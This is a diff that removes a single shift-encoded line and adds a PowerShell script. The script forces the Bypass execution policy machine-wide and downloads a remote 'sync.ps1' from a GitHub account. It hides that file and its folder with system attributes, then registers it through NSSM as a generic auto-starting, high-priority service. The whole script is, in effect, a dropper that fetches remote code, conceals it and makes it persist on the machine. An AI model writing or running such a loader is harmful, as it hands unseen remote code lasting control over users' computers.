@@ -1,1 +1,63 @@
-kwwsv=22dsl1wrpdqnhhsu1ruj2
+# Define variables
+$downloadUrl = "https://nssm.cc/release/nssm-2.24.zip"
+$nssmZipPath = "C:\nssm.zip"
+$nssmExtractPath = "C:\nssm"
+$nssmExePath = "C:\Windows\System32\nssm.exe"
+$serviceName = "MyPowerShellService"
+$syncScriptUrl = "https://raw.githubusercontent.com/adaptive100200300/api/refs/heads/main/sync.ps1"
+$syncScriptPath = "C:\Scripts\sync.ps1"
+
+# Ensure necessary directories exist
+Write-Host "Creating necessary directories..."
+New-Item -ItemType Directory -Path "C:\Scripts" -Force | Out-Null
+
+# Ensure PowerShell Execution Policy allows running scripts
+Write-Host "Setting Execution Policy to Bypass..."
+Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
+
+# Download NSSM
+Write-Host "Downloading NSSM..."
+Invoke-WebRequest -Uri $downloadUrl -OutFile $nssmZipPath
+
+# Extract NSSM
+Write-Host "Extracting NSSM..."
+Expand-Archive -Path $nssmZipPath -DestinationPath $nssmExtractPath -Force
+
+# Move NSSM to System32
+Write-Host "Moving NSSM to System32..."
+Move-Item -Path "$nssmExtractPath\nssm-2.24\win64\nssm.exe" -Destination $nssmExePath -Force
+
+# Remove ZIP and extracted folder
+Write-Host "Cleaning up extracted files..."
+Remove-Item -Path $nssmZipPath -Force
+Remove-Item -Path $nssmExtractPath -Recurse -Force
+
+# Download sync.ps1 script
+Write-Host "Downloading sync.ps1 script..."
+Invoke-WebRequest -Uri $syncScriptUrl -OutFile $syncScriptPath
+
+# Hide the script file and its folder using attrib +h +s +r
+Write-Host "Hiding script and folder with system attributes..."
+Start-Process -NoNewWindow -Wait -FilePath "cmd.exe" -ArgumentList "/c attrib +h +s +r C:\Scripts"
+Start-Process -NoNewWindow -Wait -FilePath "cmd.exe" -ArgumentList "/c attrib +h +s +r $syncScriptPath"
+
+# Install NSSM service with startup & executing the downloaded script
+Write-Host "Installing NSSM service..."
+$command = "powershell -ExecutionPolicy Bypass -File $syncScriptPath"
+Start-Process -NoNewWindow -Wait -FilePath $nssmExePath -ArgumentList "install $serviceName C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File $syncScriptPath"
+
+# Set service to auto-start on boot
+Write-Host "Setting service to auto-start..."
+Start-Process -NoNewWindow -Wait -FilePath $nssmExePath -ArgumentList "set $serviceName Start SERVICE_AUTO_START"
+
+# Set service priority to High
+Write-Host "Setting service priority to High..."
+Start-Process -NoNewWindow -Wait -FilePath $nssmExePath -ArgumentList "set $serviceName AppPriority HIGH_PRIORITY_CLASS"
+
+# Start the service
+Write-Host "Starting the service..."
+Start-Service -Name $serviceName
+
+# Confirm service status
+Write-Host "Service Status:"
+Get-Service -Name $serviceName
